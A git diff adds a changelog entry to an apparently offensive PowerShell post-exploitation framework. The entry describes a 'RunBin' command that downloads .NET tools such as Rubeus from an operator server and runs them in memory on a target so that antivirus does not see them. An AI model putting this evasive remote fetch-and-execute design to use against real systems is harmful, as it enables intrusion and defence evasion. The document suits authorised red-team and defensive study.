@@ -5,6 +5,41 @@ Format: `[LAYER] Change description — *why this matters operationally*`
 
 ---
 
+## [2026-05-26] feat(runbin): reflective .NET assembly loading — RunBin command
+
+### New command: `RunBin <name> [args]`
+
+Allows the operator to load and execute a managed .NET assembly entirely in memory,
+with no disk write on the operator or target machine.
+
+**How it works:**
+
+- `Fetch-BinaryTool` fetches the binary via `DownloadData` (not `DownloadString`), stores it
+  as base64 in `$global:ToolCache`. Tries operator HTTP server (`http://<ListenerIP>:8080/`)
+  first (`.exe` then `.dll`), then falls back to GitHub.
+- **Local shell (option 5):** loads from cache, calls `[Reflection.Assembly]::Load([byte[]])`
+  and invokes `EntryPoint` with any supplied args.
+- **Active pipe session:** streams the binary via `Send-Module` (same `__MODULE_BEGIN__/CHUNK/END__`
+  protocol as other modules), then sends a one-liner to the target that finds the loaded assembly
+  in `AppDomain` and invokes its entry point.
+
+**Changes:**
+
+| File | Change |
+|------|--------|
+| `Amnesiac.ps1` | `Fetch-BinaryTool` added after `Fetch-ToolFromGitHub` |
+| `Amnesiac.ps1` | `RunBin` handler in `Start-LocalShell` (before fall-through) |
+| `Amnesiac.ps1` | `RunBin` handler in `InteractWithPipeSession` (after GodPotato) |
+| `Amnesiac.ps1` | `RunBin` listed in both local shell and session help menus |
+| `Amnesiac_ShellReady.ps1` | Same four changes (no colour codes) |
+
+**Operational context:** Post-exploitation tools like Rubeus, SharpHound, or Seatbelt are
+.NET assemblies that benefit from reflective loading — no `IEX`, no script, no AV-visible
+file drop. Operator hosts the binary on their server; a single `RunBin Rubeus.exe triage`
+streams and executes it on the target entirely in memory.
+
+---
+
 ## [2026-05-25] feat(lpe): LPE tool section — PowerUp, PrivescCheck, GodPotato
 
 ### New section
